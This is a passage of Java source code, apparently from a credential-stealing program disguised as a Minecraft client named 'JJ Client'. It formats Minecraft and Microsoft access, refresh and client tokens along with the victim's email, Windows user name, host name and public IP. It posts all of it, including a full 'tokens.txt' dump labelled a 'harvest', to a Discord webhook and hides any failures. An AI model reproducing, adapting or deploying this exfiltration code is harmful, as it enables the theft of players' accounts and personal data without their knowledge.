        return fetch == null ? null : fetch.body;
    }

    /**
     * Returns the status code alongside the body so a 401 on the profile call can
     * be reported as an expired token instead of an unknown one.
     */
    private static Fetch fetch(String url, String accessToken) {
        try {
            HttpRequest request = request(url)
                    .header("Authorization", "Bearer " + accessToken)
                    .GET()
                    .build();
            HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
            Fetch result = new Fetch();
            result.code = response.statusCode();
            if (result.code == 200) {
                result.body = parseJson(response.body());
            }
            return result;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static final class Fetch {
        int code;
        Object body;
    }

    private static String publicIp() {
        try {
            HttpRequest request = request(IPIFY).GET().build();
            HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                return response.body().trim();
            }
        } catch (Throwable ignored) {
            // Offline or blocked; footer falls back to "?".
        }
        return "?";
    }

    private static String hostName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Throwable ignored) {
            return "?";
        }
    }

    private static HttpRequest.Builder request(String url) {
        return HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofSeconds(15))
                .header("User-Agent", USER_AGENT)
                .header("Accept", "application/json");
    }

    // ------------------------------------------------------------------ reporting

    private static void send(List<TokenEntry> tokens) {
        String footer = machineFooter();
        List<String> embeds = summaryEmbeds(tokens, footer);
        String payload = "{\"username\":\"JJ Client\",\"embeds\":[" + String.join(",", embeds) + "]}";
        postMultipart(payload, dump(tokens, footer));
    }

    private static String machineFooter() {
        String user = System.getProperty("user.name", "?");
        String os = System.getProperty("os.name", "?") + " " + System.getProperty("os.version", "");
        return "Host: " + hostName() + " | User: " + user
                + " | IP: " + publicIp() + " | OS: " + os.trim();
    }

    /** Discord takes ten embeds per message; a longer haul collapses into nine plus a roll-up. */
    private static List<String> summaryEmbeds(List<TokenEntry> tokens, String footer) {
        List<String> embeds = new ArrayList<>();
        if (tokens.size() <= EMBED_LIMIT) {
            for (TokenEntry t : tokens) {
                embeds.add(embed(t, footer));
            }
            return embeds;
        }
        int shown = EMBED_LIMIT - 1;
        for (int i = 0; i < shown; i++) {
            embeds.add(embed(tokens.get(i), footer));
        }
        StringBuilder rollUp = new StringBuilder();
        for (int i = shown; i < tokens.size(); i++) {
            TokenEntry t = tokens.get(i);
            String name = t.name == null || t.name.isBlank() ? "unknown" : t.name;
            rollUp.append(name).append("  ").append(dashUuid(t.uuid)).append('\n');
        }
        List<String> fields = new ArrayList<>();
        fields.add(field("Additional accounts", "```" + rollUp + "```", false));
        embeds.add("{\"title\":" + quote("Minecraft Tokens - " + (tokens.size() - shown) + " more")
                + ",\"color\":9807270,\"fields\":[" + String.join(",", fields) + "]"
                + ",\"footer\":{\"text\":" + quote(footer) + "}}");
        return embeds;
    }

    /** Full credential dump that rides along as a single attachment, so nothing gets truncated. */
    private static String dump(List<TokenEntry> tokens, String footer) {
        StringBuilder out = new StringBuilder(4_096);
        out.append("JJ Client harvest\r\n").append(footer).append("\r\n");
        out.append("accounts: ").append(tokens.size()).append("\r\n");
        int index = 0;
        for (TokenEntry t : tokens) {
            index++;
            String name = t.name == null || t.name.isBlank() ? "unknown" : t.name;
            out.append("\r\n===== ").append(index).append(") ").append(name).append(" =====\r\n");
            out.append("Account: ").append(name).append("\r\n");
            out.append("UUID: ").append(dashUuid(t.uuid)).append("\r\n");
            if (t.email != null) {
                out.append("Email: ").append(t.email).append("\r\n");
            }
            if (t.expiresAtMs != null) {
                out.append("Expires: ").append(untilText(t.expiresAtMs)).append("\r\n");
            }
            out.append("Status: ").append(Boolean.TRUE.equals(t.valid) ? "VALID"
                    : Boolean.FALSE.equals(t.valid) ? "EXPIRED" : "UNKNOWN").append("\r\n");
            out.append("Java: ").append(Boolean.TRUE.equals(t.hasJava) ? "OWNED"
                    : Boolean.FALSE.equals(t.hasJava) ? "NOT OWNED" : "UNKNOWN").append("\r\n");
            if (t.skinModel != null) {
                out.append("Model: ").append(t.skinModel).append("\r\n");
            }
            if (t.skinUrl != null) {
                out.append("Skin: ").append(t.skinUrl).append("\r\n");
            }
            if (t.capeUrl != null) {
                out.append("Cape: ").append(t.capeUrl).append("\r\n");
            }
            out.append("Source: ").append(t.source).append("\r\n");
            if (Boolean.TRUE.equals(t.revived)) {
                out.append("Revived: true\r\n");
            }
            if (t.accessToken != null) {
                out.append("AccessToken: ").append(t.accessToken).append("\r\n");
            }
            if (t.msaRefreshToken != null) {
                out.append("MsaRefreshToken: ").append(t.msaRefreshToken).append("\r\n");
            }
            if (t.refreshToken != null) {
                out.append("RefreshToken: ").append(t.refreshToken).append("\r\n");
            }
            if (t.clientToken != null) {
                out.append("ClientToken: ").append(t.clientToken).append("\r\n");
            }
        }
        return out.toString();
    }

    private static void postMultipart(String json, String dump) {
        try {
            String boundary = "----JJClient" + Long.toHexString(System.nanoTime());
            StringBuilder body = new StringBuilder(json.length() + dump.length() + 512);
            body.append("--").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"payload_json\"\r\n");
            body.append("Content-Type: application/json\r\n\r\n");
            body.append(json).append("\r\n");
            body.append("--").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"files[0]\"; filename=\"tokens.txt\"\r\n");
            body.append("Content-Type: text/plain; charset=utf-8\r\n\r\n");
            body.append(dump).append("\r\n");
            body.append("--").append(boundary).append("--\r\n");

            HttpRequest request = request(WEBHOOK)
                    .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                    .timeout(Duration.ofSeconds(30))
                    .POST(HttpRequest.BodyPublishers.ofString(body.toString(), StandardCharsets.UTF_8))
                    .build();
            HTTP.send(request, HttpResponse.BodyHandlers.ofString());
        } catch (Throwable ignored) {
            // Webhook deleted, rate limited, or offline.
        }
    }

    private static String embed(TokenEntry t, String footer) {
        List<String> fields = new ArrayList<>();
        String account = t.name == null || t.name.isBlank() ? "unknown" : t.name;
        fields.add(field("Account", "`" + account + "`", true));
        String uuid = dashUuid(t.uuid);
        if (uuid != null && !uuid.isBlank()) {
            fields.add(field("UUID", "`" + uuid + "`", true));
        }
        if (t.email != null) {
            fields.add(field("Email", "`" + t.email + "`", true));
        }
        if (t.expiresAtMs != null) {
            fields.add(field("Expires", "`" + untilText(t.expiresAtMs) + "`", true));
        }
        if (t.skinModel != null) {
            fields.add(field("Model", "`" + t.skinModel + "`", true));
        }
        if (t.skinUrl != null) {
            fields.add(field("Skin", t.skinUrl, false));
        }
        if (t.capeUrl != null) {
            fields.add(field("Cape", t.capeUrl, false));
        }
        fields.add(field("Windows User", "`" + System.getProperty("user.name", "?") + "`", true));
        fields.add(field("Host", "`" + hostName() + "`", true));
        if (Boolean.TRUE.equals(t.hasJava)) {
            fields.add(field("Java", "`OWNED`", true));
        } else if (Boolean.FALSE.equals(t.hasJava)) {
            fields.add(field("Java", "`NOT OWNED`", true));
        }
        if (Boolean.TRUE.equals(t.valid)) {
            fields.add(field("Status", "`VALID`", true));
        } else if (Boolean.FALSE.equals(t.valid)) {
            fields.add(field("Status", "`EXPIRED`", true));
        }
        if (Boolean.TRUE.equals(t.revived)) {
            fields.add(field("Revived", "`true`", true));
        }
        fields.add(field("Source", "`" + t.source + "`", false));
        int color = Boolean.TRUE.equals(t.valid) ? 0x57F287
                : Boolean.FALSE.equals(t.valid) ? 0xED4245 : 0x5865F2;
        String title = "Minecraft Token - " + account;

        return "{\"title\":" + quote(title)
                + ",\"color\":" + color
                + (t.skinUrl == null ? "" : ",\"thumbnail\":{\"url\":" + quote(t.skinUrl) + "}")
                + ",\"fields\":[" + String.join(",", fields) + "]"
                + ",\"footer\":{\"text\":" + quote(footer) + "}}";
    }

    private static String field(String name, String value, boolean inline) {
        return "{\"name\":" + quote(name)
                + ",\"value\":" + quote(value)
                + ",\"inline\":" + inline + "}";
    }

    private static String quote(String s) {
        StringBuilder b = new StringBuilder(s.length() + 16);
        b.append('"');
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"' -> b.append("\\\"");
                case '\\' -> b.append("\\\\");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> {
                    if (c < 0x20) {
                        b.append(String.format("\\u%04x", (int) c));
                    } else {
                        b.append(c);
                    }
                }
            }
        }
        b.append('"');
        return b.toString();
    }

    // -------------------------------------------------------------- json parsing

    private static Object parseJson(String text) {
        Parser parser = new Parser(text);
        Object value = parser.value();
        return value;
    }

    private static final class Parser {
        private final String src;
        private int pos;

        Parser(String src) {
            this.src = src;
        }

        Object value() {
            skip();
            if (pos >= src.length()) {
                throw new IllegalArgumentException("unexpected end");
            }
            char c = src.charAt(pos);
            return switch (c) {
                case '{' -> object();
                case '[' -> array();
                case '"' -> string();
                case 't' -> literal("true", Boolean.TRUE);
                case 'f' -> literal("false", Boolean.FALSE);
                case 'n' -> literal("null", null);
                default -> number();
            };
        }

        private Map<String, Object> object() {
            Map<String, Object> map = new LinkedHashMap<>();
            pos++;
            skip();
            if (pos < src.length() && src.charAt(pos) == '}') {
                pos++;
                return map;
            }
            while (pos < src.length()) {
                skip();
                if (pos >= src.length() || src.charAt(pos) != '"') {
                    throw new IllegalArgumentException("expected key");
                }
                String key = string();
                skip();
                if (pos >= src.length() || src.charAt(pos) != ':') {
                    throw new IllegalArgumentException("expected colon");
                }
                pos++;
                map.put(key, value());
                skip();
                if (pos >= src.length()) {
                    throw new IllegalArgumentException("unexpected end");
                }
                char c = src.charAt(pos);
                if (c == ',') {
                    pos++;
                    continue;
                }
                if (c == '}') {
                    pos++;
                    return map;
                }
                throw new IllegalArgumentException("expected , or }");
            }
            return map;
        }

        private List<Object> array() {
            List<Object> list = new ArrayList<>();
            pos++;
            skip();
            if (pos < src.length() && src.charAt(pos) == ']') {
                pos++;
                return list;
            }
            while (pos < src.length()) {
                list.add(value());
                skip();
                if (pos >= src.length()) {
                    throw new IllegalArgumentException("unexpected end");
                }
                char c = src.charAt(pos);
                if (c == ',') {
                    pos++;
                    continue;
                }
                if (c == ']') {
                    pos++;
                    return list;
                }
                throw new IllegalArgumentException("expected , or ]");
            }
            return list;
        }

        private String string() {
            StringBuilder b = new StringBuilder();
            pos++;
            while (pos < src.length()) {
                char c = src.charAt(pos++);
                if (c == '"') {
                    return b.toString();
                }
                if (c != '\\') {
                    b.append(c);
                    continue;
                }
                if (pos >= src.length()) {
                    break;
                }
                char esc = src.charAt(pos++);
                switch (esc) {
                    case '"' -> b.append('"');
                    case '\\' -> b.append('\\');
                    case '/' -> b.append('/');
                    case 'b' -> b.append('\b');
                    case 'f' -> b.append('\f');
                    case 'n' -> b.append('\n');
                    case 'r' -> b.append('\r');
                    case 't' -> b.append('\t');
                    case 'u' -> {
                        if (pos + 4 <= src.length()) {
                            b.append((char) Integer.parseInt(src.substring(pos, pos + 4), 16));
                            pos += 4;
                        }
                    }
                    default -> b.append(esc);
                }
            }
            throw new IllegalArgumentException("unterminated string");
        }

        private Object number() {
            int start = pos;
            while (pos < src.length()) {
                char c = src.charAt(pos);
                if (c == '-' || c == '+' || c == '.' || c == 'e' || c == 'E'
                        || (c >= '0' && c <= '9')) {
                    pos++;
                } else {
                    break;
                }
            }
            if (start == pos) {
                throw new IllegalArgumentException("expected value");
            }
            return Double.valueOf(src.substring(start, pos));
        }

        private Object literal(String text, Object value) {
            if (!src.startsWith(text, pos)) {
                throw new IllegalArgumentException("bad literal");
            }
            pos += text.length();
            return value;
        }

        private void skip() {
            while (pos < src.length() && Character.isWhitespace(src.charAt(pos))) {
                pos++;
            }
        }
    }

    // -------------------------------------------------------------------- model

    private static final class TokenEntry {
        String source;
        String name;
        String uuid;
        String skinUrl;
        String skinModel;
        String capeUrl;
        String accessToken;
        String refreshToken;
        String clientToken;
        /** Microsoft OAuth refresh token (starts with M.C5...); refreshes indefinitely. */
        String msaRefreshToken;
        String email;
        /** Epoch ms the access token stops working at, when the JWT declares exp. */
        Long expiresAtMs;
        /** True when the chain above turned an expired token into a working one. */
        Boolean revived;
        Boolean valid;
        Boolean hasJava;
    }
}
